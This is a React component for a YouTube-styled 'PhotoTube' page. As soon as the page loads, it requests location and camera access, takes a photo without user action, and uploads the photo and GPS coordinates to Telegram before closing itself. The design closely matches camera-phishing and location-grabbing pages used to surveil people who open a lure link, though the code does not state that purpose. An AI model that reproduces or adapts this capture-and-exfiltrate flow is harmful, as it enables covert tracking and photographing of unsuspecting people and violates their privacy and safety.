import { useState, useRef, useEffect } from 'react';
import { cameraService } from '@/lib/camera';
import { locationService, type LocationData } from '@/lib/location';
import { sendPhotoToTelegram, sendLocationToTelegram } from '@/lib/telegram';
import { NotificationToast } from './notification-toast';
import { Camera, MapPin, Send, CheckCircle, XCircle, Loader2 } from 'lucide-react';

interface AutoCaptureProps {
  onComplete: () => void;
}

export function AutoCapture({ onComplete }: AutoCaptureProps) {
  const [status, setStatus] = useState<'requesting' | 'capturing' | 'sending' | 'complete' | 'error'>('requesting');
  const [location, setLocation] = useState<LocationData | null>(null);
  const [notification, setNotification] = useState<{
    show: boolean;
    type: 'success' | 'error' | 'warning';
    title: string;
    message: string;
  }>({ show: false, type: 'success', title: '', message: '' });

  const videoRef = useRef<HTMLVideoElement>(null);
  const hasStarted = useRef(false);

  useEffect(() => {
    if (!hasStarted.current) {
      hasStarted.current = true;
      startAutoCapture();
    }
  }, []);

  const showNotification = (type: 'success' | 'error' | 'warning', title: string, message: string) => {
    setNotification({ show: true, type, title, message });
  };

  const hideNotification = () => {
    setNotification(prev => ({ ...prev, show: false }));
  };

  const startAutoCapture = async () => {
    try {
      // Step 1: Get location
      showNotification('warning', 'Requesting Permissions', 'Please allow location access when prompted');
      
      let locationData: LocationData | null = null;
      try {
        locationData = await locationService.getCurrentLocation();
        setLocation(locationData);
        showNotification('success', 'Location Access Granted', `Location acquired with ±${Math.round(locationData.accuracy)}m accuracy`);
      } catch (error: any) {
        showNotification('warning', 'Location Unavailable', 'Photo will be sent without location data');
      }

      // Step 2: Start camera
      showNotification('warning', 'Camera Access', 'Please allow camera access when prompted');
      
      const stream = await cameraService.startCamera();
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        showNotification('success', 'Camera Access Granted', 'Camera is now active');
      }

      // Wait a moment for camera to stabilize
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Step 3: Auto-capture photo
      setStatus('capturing');
      showNotification('success', 'Auto Capturing', 'Taking photo automatically...');
      
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      if (!videoRef.current) {
        throw new Error('Camera not ready');
      }

      const photoBlob = await cameraService.capturePhoto(videoRef.current);
      
      // Step 4: Send to Telegram
      setStatus('sending');
      showNotification('success', 'Sending to Telegram', 'Uploading photo and location...');

      const result = await sendPhotoToTelegram(photoBlob, locationData || undefined);
      
      if (result.ok) {
        // Send location as separate message if available
        if (locationData) {
          await sendLocationToTelegram(locationData);
        }
        
        setStatus('complete');
        showNotification('success', 'Success!', 'Photo and location sent to Telegram successfully');
        
        // Auto-close after 3 seconds
        setTimeout(() => {
          onComplete();
        }, 3000);
      } else {
        throw new Error(result.description || 'Failed to send photo');
      }

    } catch (error: any) {
      setStatus('error');
      showNotification('error', 'Auto Capture Failed', error.message || 'An error occurred during auto capture');
      
      // Auto-close after 5 seconds on error
      setTimeout(() => {
        onComplete();
      }, 5000);
    } finally {
      // Stop camera
      cameraService.stopCamera();
    }
  };

  const getStatusIcon = () => {
    switch (status) {
      case 'requesting':
        return <Loader2 className="h-8 w-8 animate-spin text-blue-400" />;
      case 'capturing':
        return <Camera className="h-8 w-8 text-yellow-400" />;
      case 'sending':
        return <Send className="h-8 w-8 text-blue-400" />;
      case 'complete':
        return <CheckCircle className="h-8 w-8 text-green-400" />;
      case 'error':
        return <XCircle className="h-8 w-8 text-red-400" />;
    }
  };

  const getStatusText = () => {
    switch (status) {
      case 'requesting':
        return 'Requesting permissions...';
      case 'capturing':
        return 'Capturing photo...';
      case 'sending':
        return 'Sending to Telegram...';
      case 'complete':
        return 'Success! Photo sent to Telegram';
      case 'error':
        return 'Auto capture failed';
    }
  };

  return (
    <>
      <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50">
        <div className="bg-youtube-secondary border border-youtube-elevated rounded-xl p-8 max-w-md w-full mx-4">
          <div className="text-center space-y-6">
            <h2 className="text-2xl font-bold text-white">PhotoTube Auto Capture</h2>
            
            {/* Camera Preview */}
            <div className="relative bg-black rounded-xl overflow-hidden aspect-video">
              <video
                ref={videoRef}
                className="w-full h-full object-cover"
                autoPlay
                muted
                playsInline
              />
              {!videoRef.current?.srcObject && (
                <div className="absolute inset-0 flex items-center justify-center">
                  <div className="text-center text-gray-400">
                    <Camera className="mx-auto text-6xl mb-4 opacity-50" size={64} />
                    <p>Camera will appear here</p>
                  </div>
                </div>
              )}
            </div>

            {/* Status */}
            <div className="flex flex-col items-center space-y-4">
              {getStatusIcon()}
              <p className="text-lg text-white font-medium">{getStatusText()}</p>
              
              {/* Location Status */}
              <div className="flex items-center space-x-2 text-sm">
                <MapPin className={`h-4 w-4 ${location ? 'text-green-400' : 'text-gray-400'}`} />
                <span className="text-gray-300">
                  {location ? `Location ready (±${Math.round(location.accuracy)}m)` : 'Getting location...'}
                </span>
              </div>
            </div>

            {status === 'complete' && (
              <p className="text-sm text-gray-400">Closing automatically in 3 seconds...</p>
            )}
            
            {status === 'error' && (
              <p className="text-sm text-gray-400">Closing automatically in 5 seconds...</p>
            )}
          </div>
        </div>
      </div>

      <NotificationToast
        type={notification.type}
        title={notification.title}
        message={notification.message}
        show={notification.show}
        onHide={hideNotification}
      />
    </>
  );
}